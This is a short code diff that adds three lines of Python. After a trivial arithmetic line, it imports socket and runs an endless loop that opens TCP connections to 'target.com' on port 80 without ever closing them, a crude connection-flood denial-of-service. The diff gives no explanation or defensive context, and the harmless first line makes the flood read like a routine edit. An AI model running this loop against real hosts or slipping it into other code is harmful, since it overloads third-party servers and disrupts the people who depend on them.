@@ -1,0 +1,3 @@
+x = 1 + 1
+import socket
+while True: socket.socket().connect(("target.com", 80))
